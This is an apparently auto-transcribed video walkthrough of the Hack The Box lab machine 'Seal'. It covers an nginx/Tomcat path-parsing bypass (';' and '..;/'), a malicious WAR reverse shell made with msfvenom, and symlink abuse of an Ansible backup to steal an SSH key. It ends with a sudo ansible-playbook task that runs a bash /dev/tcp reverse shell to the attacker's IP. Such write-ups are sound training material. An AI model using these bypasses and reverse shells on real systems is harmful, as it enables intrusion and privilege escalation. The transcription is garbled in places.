 what's going on youtube this is ipsec me doing seal from hack the box which involves one of my favorite types of vulnerabilities and that's when there's a big talk about it but there's never really any patch the talking question is from orange sy the server side request forgery king back in black cat 2018 it involves a tomcat server that is running behind a reverse proxy such as engine x and the reverse proxy is trying to block the access of management functions of tomcat such as accessing slash manager html the server side request forgery involves putting a payload in the url that engine x just reads and doesn't do anything with but tomcat will actually remove a portion of that url letting you rebuild the url when it gets to the tomcat application therefore bypassing any um blacklist and then once you get a shell on the box it involves a private via ansible which i just really liked so with that being said let's jump in as always we're gonna start off with the nmap so dash sc for default scripts sv enumerate versions oh a output off formats bring the nmap directory and call it seal and then the ip address of 10 10 10 250. this can take some time to run so i've already ran it looking at the results we have a handful of ports open the first one being ssh on port 22 and its banner tells us it's an ubuntu server the next thing we have is https on port 443 its banner tells us its engine x running on ubuntu and typically when i see engine x and ctfs i think this is going to be not a php application because for some reason php is always installed with apache if you pretty much google install php linux it always talks about the lamp stack that's linux apache my sequel php um so yeah i'm guessing this is probably like a python node.js ruby on rails tomcat or some other application where engine x is just a reverse proxy pointing to like a wsgi application if it is a python thing so let's just move on the ssl cert gives us the hostname of sealed.htb so let's put this in our host file uh let's do 10 1010 250 cl.htb and then moving on there's not too much interesting we see the certificate is created on may 2021 and expires may 2022 it's about it maybe when like the server is built but it could be just when the certificate was requested so you can't really take too much information based upon the ssl the next thing we have is port 8080 and the nmap is telling us it's just hdb proxy but looking at the fingerprint string script it is definitely a web server because we have a 404 request i don't even know it says 404 but this is giving us a 401 so not exactly what's going on there it's giving us a cookie of j session id so chances are port 8080 is tomcat then going down don't really have anything else so let's go take a look at the application going to 10 10 10 to 50 we have a ssl warning so let's just accept it and then i'm also going to do https 10 10 10 to i'm at seal.htb and see if it has any type of virtual host routing where i p address brings us to a different page it does not look like that i'm going to look at the source code real quick to see what is in here and don't see all that much i was looking for like any signs this is wordpress or what language it is but looks like a relatively static page but it is letting us type things so i'm going to try searching for broccoli because it asked me for a vegetable i put this here it does a get request to the page and the page looks the same scrolling down we have a contact form we can do pretty much the same thing and it's just directing us back to this page so i'm going to quickly fuzz this parameter and then if there's nothing here we'll put a dirt bust on this page because we always like having recon going and move on to the next thing so let's open up burp suite um i hit alt f2 to bring up that menu that's typically like the linux way to open up a run prompt on when it like windows they call it the run prop like windows key are alt f2 on linux so let's search something so search broccoli we should now be going into grip suite intercept is on uh this is not it that's maps.google uh try searching this again why drop that intercept on burp suite i did control or uh shift r to like force a refresh it was some type of caching thing i think that was happening but we can get this page we see 19966 i'm going to do like please subscribe and we see 19 966 still so chances are this search doesn't really do anything uh we can send this over to w fuzz to test it out so i'm going to do w fuzz dash u htp 10 10 10 250 do the search and then fuzz and then i want to do w for word list opt set list fuzzing special characters and let's see we have to do https and we have a lot of things that give us a 400 error i'm gonna do like url and code all these so w fuzz dash e encoders this will list all the encoders we can use um probably we want a url and encode all characters using the percent xx escape so i'm guessing this is what we want and how you do w uh incurs with w fuzz is after the word list you just do comma and then the encoder you want to use so it did almost all mall we'd have some characters where the encoder just decided not to encode it for whatever reason but everything seems to be about the same size uh these 400s i'm not really that interested in them because they're bad characters i don't know how to exploit if they were like a bad character of brackets i may think ssti if it was a quote i would think it's sql injection but question mark semicolon i i don't know what to do with those so we'll just ignore that and move on to a go buster and then we'll look at port 8080 so go buster dir w for word list opt sec list discovery web content wrapped small words dot text and then this page we don't know exactly what the extension is so we can't really specify one uh dash u for url http s 10 10 10 250 and i think i need dash k because it's going to complain about a ssl error k will ignore that so with go busto running let's go take a look at port 8080. i'm going to take the proxy off we can go to 10 10 10 250 port 8080 and it looks like the tomcat application or maybe j session id is not tomcat i'm pretty sure it is do jsession id to see what this says uh servlet j2ee see j session id yeah i think it's tomcat tomcat app deploy so pretty sure this is tomcat it is a application called get bucket so the first thing i want to do is look at get bucket default user or default credentials and we can see both username and password or root so trying to log in with root gives us an error i'm looking at the page i don't see anything that would indicate a version if i could find a version very quickly then i'd be going down like the cve route don't see anything it lets us create an account so let's do that ipsec password is password ipsec and we need a mail address a root at ipsec.rocks additional mail address not applicable does that work looks like it does so log in with ipsec and password and there's a lot of applications going all the way down to see if there's a version info as well but we have two repositories we have root seal market and infra and for loaded first so i'm going to take a look at it we have infra automation looking at site.yaml host tomcat servers this is a playbook so this looks like it is going to be something ansible related i'm going to look at the tomcat we look at files init.sh so i'm guessing this just copies it and an ansible we definitely want to look at tasks because this is going to be what it does so can i make this bigger i'm just going to go to raw save let's just do copy and put this in a terminal prompt so what was this called main.yaml so let's see can i do percent s one two three four there we go so the name is just the name of the task an ansible it can be anything it's using the yum plugin of ansible so this is just doing a yum install and then the java the state present says we want it to be installed if we do state equals absent there it would remove it the name we're adding the group tomcat so again it's just doing group colon name equals tomcat you could have also done state present there to make sure it adds the group and if you did again state equals absent it would remove the group so adding user it's going to create the tomcat user put its home directory here and not create it become become is going to be like a pseudo command and you can see the become method is sudo so there's probably other ways you can switch users so before adding this user it's going to run sudo next it's going to download tomcat from this url extract it using the command which command is like os dot system it's going to execute a command so let's see it changes the directory before executing the command to user share and then does that tart extract command to extract it sim link the application change ownership again this is the file plug-in of ansible so you can just change permissions things like that a template so this is going to install something and the server.xml is going to be a yaml file so you could like pass variables in that so if the server.xml had credentials you could have the server.xml have the credentials like cred and then pass this in through an environment variable or something when you copy it let's see create tomcat users it doesn't look like there's really anything interesting in this but that was a quick work uh rundown on how that would work let's take a look at the seal market app we have a readme that says remove mutual authentication for dashboard setup registration and login features and whenever i think mutual authentication i think of ssl and that's like ssl mutual authentication i think i talked about it in like a securing vendor web app thing so if you want to know more about it let's see mutual yeah look at this video but essentially things that don't have a specific ssl client certificate won't be able to access various pages so if we go back to our go buster i'm guessing let's see let's go to slash admin let's do seal admin because that was a 302 or 301 this is just returning a tomcat error let's go to slash manager we're getting a forbidden from engine x so engine x blocked us from doing this so either um it's blocking anything that's not local host or it's doing some type of mutual authentication on this page and blocking us or some other logic but i go down the fact that nginx blocked us because that's an engine x thing if we go to slash admin we can see this is a tomcat error so we know nginx did not block us let's go to the tomcat config catalina the main thing i like about tomcat is going into this tomcat users file and looking for credentials we don't really have anything but it does support history and we can see there are multiple versions of this i'm going to click on this commit we can see what was removed from this and that is a credential so i'm going to copy this over to my box so let's do v creds dot text uh wrong paste there we go and delete words to we get to tomcat and then let's see that was a four there i think it started with four two and ends with z percent let's just double check that for two z percent okay so we copy that correct looking at other things we have app which is probably going to be the web application itself i would probably click around here to see if i can find where config is to for it to talk to like a database but i don't really see anything let's take a look at nginx if we do sites available default we can see the ssl certificate thing sl protocols and here we go so location slash manager html it's doing a ssl client verify which is the mutual authentication it's doing that on admin dashboard as well host manager html and then slash it does not do anything so this next step is a really weird attack that if you know a lot about ssrf it would probably be pretty natural so if i do ssrf tomcat engine x let's see if it comes up if not we'll just go to the orange side talk let's see maybe this i think this is it actually breaking parcel logic yep from black cat 2018 and this tomcat version i think is from like 2020 so it's a still somewhat common i would go watch this talk if you can find it on youtube but the key thing we want is when the reverse proxy meets these pads so what this is going to do is we give it this path and when apache nginx and iis sees it it sees that path but when tomcat sees it it sees this and this becomes very important because when engine x sees let's see slash manager then let's do name is equal to orange slash admin so when engine x sees this path do we still have it here it's not going to match um we can do actually admin to test it out real quick admin dashboard so when engine x sees this the slash admin semicolon name equals orange um it's not going to match anything it's going to match this because there's stuff in between the admin and dashboard but when tomcat sees it it's going to drop this stuff and then just leave slash admin dashboard if this attack works so let's try this out real quick so i'm going to go to my browser we're going to go to skill.htb slash admin dashboard and we get the 403 forbidden i'm going to do that weird payload and we actually get the dashboard so it is vulnerable to this attack now what's really interesting here is we can do slash manager and then html and we get login credentials so we can try those tomcat credentials so i'm going to do tomcat and paste this password in and we get access to this tomcat web manager so here we can upload a war file and pop the application the other path traversal attack that is interesting in the talk i like using it more just because [Music] i don't fully understand why tomcat just ignores this but i like let's see this path traversal look more it's pretty much the same thing we just do slash dot dot semicolon slash so if i do manager html dot dot semicolon html or manager let's do does not exist and then html it does the same exact thing so let's do v creds that path was this so there's two ways you can exploit this path traversal whatever one you like you can use um i'm just for some reason i like looking at this one more than i like looking at this one and if one doesn't work definitely try the other it's always nice to have options so with this being having um let's create a malicious war file so for that i'm gonna do msf venom dash p java jsp shell reverse tcp and that's something you just learn with experience when you exploit enough tomcat instances you know what um msf venom payload to use right away hellhouse 1010 14 8 l port 9001 format is gonna be a war and then we'll output it to shell.org and then for this we're actually going to want to um once we upload this intercept the request so hdb um what is a seal so i'll do it without intercepting the request we'll deploy it and we get the forbidden because the actual button has as good as manager html so what we want to do is go to burp suite make sure proxy is clear when we deploy this we just want to do that weird attack so does not exist semicolon like that so now we no longer hit that engine x config blocking this forward and we can see slash shell has been deployed so if i do nc lvmp 9001 we can click on shell and we get a connection back if i do id we see tomcat so now i'm going to do python3 dash c import pty pty.spawn then bash and then ctrl z stty raw minus echo semicolon fg hit enter twice and now we have a good shell i'm going to export term is equal to x term which lets me clear the screen and the very first thing i'd probably do is run len p's but we could also just um run like a program like p spy so if one of my favorite things is github piece by go to google and we can see this application you can just download it from here i'm just going to do locate piece by 64 and you can see i run it quite often i'm just going to copy it from a box let's do player 2 make dirt dub dub dub go in here and then cp the program here python 3 m http server and let's go dev shm and w get it so 10 10 14 8 8 000 piece by 64 s so now we are downloading it sage mod plus x of put too much there and when we execute it it will tell us what applications um start up and i generally like just running this once i get a shell i'm going to get a drink and then coming back and looking at what applications start up within the first few minutes of running this because this will tell you like if cron jobs or things like that are running and right here we see ben sh it's doing a sleep 30 then doing sudo dash u luis user bin ansible playbook and it's running this playbook so what i'm going to do is take a look at it so if we went into up backups playbook we can see run.yaml i'm going to do this in vim and hope we have syntax highlighting looks a bit prettier so host localhost that means it's going to run on this box the tasks it's going to copy files so it's going to synchronize the directory dashboard to opt backup files and it's going to use copy links if you don't know any like ansible plugin you can just probably google ansible plugin or ansible module probably ansible module and then the name let's take brep suite off then go to google and see if we get to the man page of synchronize so it's a wrapper around rsync and then we can look at what copy links is and copy links is going to copy sim links as items rather than the reference so if this option is no then it's just going to copy the shortcut if this option is yes anytime you try to copy a sim link it's not going to copy the shortcut it's going to go where the assembling points do and copy that file so with that being said it's running by luis so potentially we can copy his like uh files out of his home directory specifically his ssh private key so we have name server backups the path opt backup files and this is where it copies and then we also got a clean state absent so it's going to delete that so the first thing i want to do is look at these opt archives so if i do lsla on this let's see there we go we can see it's been run twice so we have backup and backup so it looks like it runs every minute and what directory was it copying from it's going to take source out of this so let's go cd here find dot dash writable and we can write to uploads you can also do writable ls because uploads is chmodded777 so that's a really handy argument with the find command to find places that you can write so if we go to uploads let's try putting a key so let's see home louise let's fix my terminal real quick so it doesn't do that annoying wrap um open up new pane stty dash a rose 26 columns 100 so s t t y rose 26 calls 100 so now when i do this line wrapping is fixed so let's do ln s to make a symbolic link i don't know if we need dash s or not if it doesn't work i'll check without it uh let's see home luis dot ssh i'm gonna guess id rsa and then we'll make this file name uh we'll call it luis.pem so if i do lsla here we have i'm type of that i did luid but we have luid.pem pointed to this file and if i try to view this i can't but if we go to that backups directory so let's do cd opt backups archives and then let's see what is the current time 8 54 24 i'm guessing well we can see the file sizes here so all the file sizes are the same so there's nothing different about it do lsla again 33 this file size is slightly bigger so let's copy this one back up because that indicates it's different to dev shm we can go in there and then gz dash d to decompress it i'll probably need g zip dash d there we go if we go into that backup directory now it's not a directory see file is this like a weird challenge now of getting into this file because it's got so many bad characters mv this weird backup to be file b oh it's a tar tur x f b so now we extracted it we got the dashboard directory we got uploads we got luid.pem it's owned by us and not a shortcut it is the whole private key so now we can ssh into the box as luis so i'm going to copy this key let's go to a new terminal v luis dot pem paste it sage mod 600 and then ssh dash i specify the file release at 10 10 10 250 yes and we get on to the box run studio dash l and it shows that we can run any ansible playbook so what i'm going to do is let's go to opt backups playbook and i'm going to copy run.yaml to my home directory and let's edit this so we're executing on localhost we don't need a copy file oh this isn't doing any commands um let's see delete this and we don't need archive i'm going to call this get shell and then let's go back over to the infrared get bucket because this had a playbook on installing something and it's just command and then the command we want so i'm going to try let's see how does the emerald work it wants it right where name is there we go so we don't need to be changing a directory and it has been doing um absolute paths so bin bash dash c bash dash i dev tcp 10 10 14 8 0 and 1 like that we need the port send it to 9001 and let's see what this says so nclvmp 9001 sudo l we're going to do playbook so sudo this run.yaml gathering facts getting a shell and we are now root so i can go into root and we can get root.text so that'll be the box hope you guys enjoyed it take care and i'll see you all next week